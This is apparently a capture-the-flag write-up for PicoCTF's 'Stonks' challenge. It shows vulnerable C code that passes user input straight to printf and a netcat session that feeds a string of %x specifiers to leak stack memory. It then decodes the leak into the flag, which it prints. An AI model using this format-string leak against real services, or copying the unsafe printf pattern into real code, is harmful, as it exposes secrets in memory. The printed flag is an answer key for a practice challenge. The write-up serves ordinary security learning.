---
title: "Stonks from PicoCTF"
categories: [PicoCTF]
tags: [PicoCTF]
---
# Stonks from PicoCTF
[page](https://play.picoctf.org/practice/challenge/105?page=14)
> Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/62f47b5b65ec7eadb96c4e34f016f68d/vuln.c) `nc mercury.picoctf.net 53437`

>Hints
>Okay, maybe I'd believe you if you find my API key.

Lets download and learn how "vuln.c" program works.
From Hints we know that for program to malfunction we need to mess with the **API KEY**.
Code we need to learn about is :
```
char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```
To be exact this line:
```
scanf("%300s", user_buf);
```

Explaining to how to mess with this is in this video : https://youtu.be/2gnaG4ocGLA?si=lRT9IVrB2gRvZDEL&t=332

> **%x**
> In C, `%x` is a format specifier used in the `printf` function to print an unsigned integer in hexadecimal format using lowercase letters.

We need to use this.
So let's connect to NetCat and Enter this into API key. We need to Enter lots of **%x** to provide almost all of the unsigned integers to find the flag. Just know that Flag will be in Hex.
```
$ nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
897d410804b00080489c3f7f49d80ffffffff1897b160f7f57110f7f49dc70897c1801897d3f0897d4106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532ffed007df7f84af8f7f57440cc5b750010f7de6ce9f7f580c0f7f495c0f7f49000ffedf8a8f7dd768df7f495c08048ecaffedf8b40f7f6bf09804b000f7f49000f7f49e20ffedf8e8f7f71d50f7f4a890cc5b7500f7f49000804b000ffedf8e88048c86897b160ffedf8d4ffedf8e88048be9f7f493fc0ffedf99cffedf99411897b160cc5b7500ffedf90000f7d8cfa1f7f49000f7f490000f7d8cfa11ffedf994ffedf99cffedf92410f7f49000f7f6c70af7f840000f7f49000002c228847464e4e57000180486300f7f71d50f7f6c960804b00018048630080486628048b85
Portfolio as of Sat Jul 13 11:36:27 UTC 2024


1 shares of HDAG
1 shares of V
5 shares of ZWGM
21 shares of FR
28 shares of DTR
47 shares of RQT
85 shares of D
504 shares of OKWD
787 shares of NNPA
Goodbye!
```

***
>Helpful tip if you dont want to type that many "%x" by hand go do this:

```
$ python3
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "%x" * 100
'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'
```
***

So our Hex is this :
```
897d410804b00080489c3f7f49d80ffffffff1897b160f7f57110f7f49dc70897c1801897d3f0897d4106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532ffed007df7f84af8f7f57440cc5b750010f7de6ce9f7f580c0f7f495c0f7f49000ffedf8a8f7dd768df7f495c08048ecaffedf8b40f7f6bf09804b000f7f49000f7f49e20ffedf8e8f7f71d50f7f4a890cc5b7500f7f49000804b000ffedf8e88048c86897b160ffedf8d4ffedf8e88048be9f7f493fc0ffedf99cffedf99411897b160cc5b7500ffedf90000f7d8cfa1f7f49000f7f490000f7d8cfa11ffedf994ffedf99cffedf92410f7f49000f7f6c70af7f840000f7f49000002c228847464e4e57000180486300f7f71d50f7f6c960804b00018048630080486628048b85
```
Let's go to [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&oeol=NEL) and enter out Hex into it.
We get Something ugly
If you look at it you can see the inverted flag:
**ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿí}**
After examining the flag We can tell that flag is divided into 4 letter blocks and reversed.
If we divide it into blocks with 4 letters and reverse it we get this:
```
ocip {FTC 0l_I 4_t5 m_ll 0m_y _y3n 4cdb ae52 }
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
```
Flag is this:
**picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}**
***
